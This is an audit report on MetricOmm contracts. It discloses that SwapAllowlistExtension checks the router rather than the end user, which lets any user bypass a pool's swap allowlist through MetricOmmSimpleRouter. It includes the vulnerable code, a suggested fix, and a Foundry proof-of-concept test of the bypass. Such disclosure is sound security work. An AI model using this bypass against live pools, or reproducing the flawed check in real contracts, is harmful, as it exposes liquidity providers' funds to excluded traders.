Audit Report

## Title
SwapAllowlistExtension Gates on Router Address Instead of End-User, Enabling Full Allowlist Bypass via MetricOmmSimpleRouter - (File: metric-periphery/contracts/extensions/SwapAllowlistExtension.sol)

## Summary
`SwapAllowlistExtension.beforeSwap` checks the `sender` argument, which is `msg.sender` of `pool.swap()`. When a user routes through `MetricOmmSimpleRouter`, the router is `msg.sender` of `pool.swap()`, so the extension checks whether the router is allowlisted rather than the actual end-user. A pool admin who allowlists the router to support router-mediated swaps inadvertently opens the pool to every user on the network.

## Finding Description
`SwapAllowlistExtension.beforeSwap` receives `sender` as its first argument and checks it against the per-pool allowlist keyed by `msg.sender` (the pool): [1](#0-0) 

The pool populates `sender` with its own `msg.sender` — the direct caller of `pool.swap()`: [2](#0-1) 

When a user calls `MetricOmmSimpleRouter.exactInputSingle()`, the router calls `pool.swap()` without forwarding the original caller. The original `msg.sender` is stored in transient storage only for the payment callback via `_setNextCallbackContext`, and is never passed to `pool.swap()`: [3](#0-2) 

Therefore `pool.swap()` sees `msg.sender = router`, and the extension checks `allowedSwapper[pool][router]`. If the router is allowlisted, the check passes for every user who calls through the router, regardless of whether that user is individually allowlisted. The same issue applies to `exactOutputSingle` and multi-hop `exactInput`/`exactOutput` paths. [4](#0-3) 

## Impact Explanation
On a curated pool where the pool admin has allowlisted `MetricOmmSimpleRouter` to support standard periphery access, any unpermissioned user can execute swaps by calling `router.exactInputSingle()` or any other `exact*` entry point. The extension sees `sender = router` (allowlisted) and passes. LP funds are exposed to trades from actors the pool admin explicitly intended to exclude. This constitutes a direct bypass of an access-control mechanism protecting LP principal on pools that rely on `SwapAllowlistExtension`.

## Likelihood Explanation
The scenario is realistic: pool admins deploying curated pools with `SwapAllowlistExtension` will naturally want their allowlisted users to access the pool through the standard `MetricOmmSimpleRouter`. The only way to enable router-mediated swaps is to allowlist the router address. Once the router is allowlisted, the per-user gate is fully bypassed for all router callers. No privileged access, special tokens, or admin cooperation is required — any EOA can call `router.exactInputSingle()`.

## Recommendation
The extension must check the economically relevant actor — the end-user — not the intermediary router. The preferred fix is to add a `trustedForwarder` registry to the extension. If `sender` is a registered trusted forwarder (e.g., the router), decode the real user from `extensionData` and check that address instead:

```solidity
function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata extensionData)
    external view override returns (bytes4)
{
    address swapper = isTrustedForwarder[msg.sender][sender]
        ? abi.decode(extensionData, (address))
        : sender;
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][swapper]) {
        revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
}
```

The router must then encode `msg.sender` into `extensionData` before calling `pool.swap()`.

## Proof of Concept

```solidity
function test_routerBypassesSwapAllowlist() public {
    // Pool admin allowlists alice and the router (to support router-mediated swaps)
    swapExtension.setAllowedToSwap(address(pool), alice, true);
    swapExtension.setAllowedToSwap(address(pool), address(router), true);

    // Attacker is NOT individually allowlisted
    address attacker = makeAddr("attacker");
    assertFalse(swapExtension.isAllowedToSwap(address(pool), attacker));

    // Attacker calls pool.swap() directly → reverts (attacker not allowlisted)
    vm.prank(attacker);
    vm.expectRevert(IMetricOmmPoolActions.NotAllowedToSwap.selector);
    pool.swap(attacker, false, int128(1000), type(uint128).max, "", "");

    // Attacker calls router.exactInputSingle() → SUCCEEDS
    // Extension sees sender = router (allowlisted), not attacker
    token1.mint(attacker, 10_000);
    vm.startPrank(attacker);
    token1.approve(address(router), 10_000);
    router.exactInputSingle(IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        recipient: attacker,
        zeroForOne: false,
        amountIn: 1000,
        amountOutMinimum: 0,
        priceLimitX64: type(uint128).max,
        deadline: block.timestamp + 1,
        tokenIn: address(token1),
        extensionData: ""
    }));
    vm.stopPrank();
    // Attacker successfully swapped on a pool they were not allowlisted for
}
```

### Citations

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L31-41)
```text
  function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L230-240)
```text
    _beforeSwap(
      msg.sender,
      recipient,
      zeroForOne,
      amountSpecified,
      priceLimitX64,
      packedSlot0Initial,
      bidPriceX64,
      askPriceX64,
      extensionData
    );
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L71-80)
```text
    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L130-137)
```text
  function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    int128 expectedAmountOut = MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountOut);
    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(params.recipient, params.zeroForOne, -expectedAmountOut, priceLimitX64, "", params.extensionData);
```
